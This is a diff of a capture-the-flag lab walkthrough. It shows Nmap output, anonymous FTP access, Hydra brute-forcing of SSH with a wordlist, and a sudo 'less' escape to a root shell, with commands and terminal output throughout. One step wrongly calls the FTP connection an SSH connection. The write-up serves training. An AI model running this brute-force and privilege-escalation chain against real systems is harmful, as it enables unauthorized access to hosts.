@@ -17,12 +17,47 @@ This writeup was last updated: 6/29/2023
 
 ```
 ```bash
+┌──(kali㉿kali)-[~]
+└─$ cat PortScan.txt 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 08:18 EDT
+Nmap scan report for 10.10.169.224
+Host is up (0.088s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.6.54.63
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
+|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
+|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds
 
 ```
 
 #
 > Scanning the FTP Server
-4. `ftp Anonymous@{TARGET IP}`
+4. `ftp Anonymous@{TARGET IP}` to connect to the target's SSH server as **Anonymous**, which we found out that we could do from our Nmap scan 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ftp Anonymous@10.10.169.224              
@@ -35,9 +70,9 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp>
 ```
-5. `ls -a`
-6. `get {FILE1}.txt`
-7. `exit`
+5. `ls -a` to list all of the files and directories, including the hidden ones, which reveals to us a single text file
+6. `get {FILE1}.txt` to download the text file onto our attack machine
+7. `exit` to terminate the FTP session and disconnect from the FTP server
 ```bash
 ftp> ls -a
 229 Entering Extended Passive Mode (|||21935|)
@@ -60,8 +95,8 @@ local: note_to_jake.txt remote: note_to_jake.txt
 ftp> exit
 221 Goodbye.
 ```
-8. `ls`
-9. `cat {FILE1}.txt`
+8. `ls` to list the available files and directories that are in our current directory to verify that the text file has been properly downloaded from the target's FTP server, which it has 
+9. `cat {FILE1}.txt` to display the downloaded file's contents onto our terminal, which reveals that one of the target's users has a weak password
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ls
@@ -77,7 +112,7 @@ Jake please change your password. It is too weak and holt will be mad if someone
 
 # Vulnerability Identification
 > Brute Forcing Using Hydra
-10. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}`
+10. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}` to attempt to crack the vulnerable user's password, which ended up working and revealing to us their password 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l jake -P rockyou.txt ssh://10.10.169.224
@@ -98,7 +133,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-29 08:25:
 
 # Vulnerability Exploitation
 > Connecting Using SSH
-11. `ssh {USER}@{TARGET IP} -p 22`
+11. `ssh {USER}@{TARGET IP} -p 22` to connect to the target with the new set of credentials that we now have using SSH
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ssh jake@10.10.169.224 -p 22                
@@ -145,7 +180,7 @@ Matching Defaults entries for jake on brookly_nine_nine:
 User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
 ```
-17. `firefox "https://gtfobins.github.io/"
+17. `firefox "https://gtfobins.github.io/"`
 
 ![]()
 
@@ -185,8 +220,27 @@ Enjoy!!
 ![]()
 
 # Command History
-
-# Dissecting Some Commands
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `ftp Anonymous@{TARGET IP}`
+4. `ls -a`
+5. `get {FILE1}.txt`
+6. `exit`
+7. `ls`
+8. `cat {FILE1}.txt`
+9. `hydra -l {USER} -P {WORDLIST PATH} ssh://{TARGET IP}`
+10. `ssh {USER}@{TARGET IP} -p 22`
+11. `ls /`
+12. `ls /home`
+13. `ls /home/holt`
+14. `cat /home/holt/{USER TEXT FILE}`
+15. `sudo -l`
+16. `firefox "https://gtfobins.github.io/"`
+17. `sudo less /etc/profile`
+18. `!/bin/sh`
+19. `whoami`
+20. `ls /root`
+21. `cat /root/{ROOT TEXT FILE}`
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
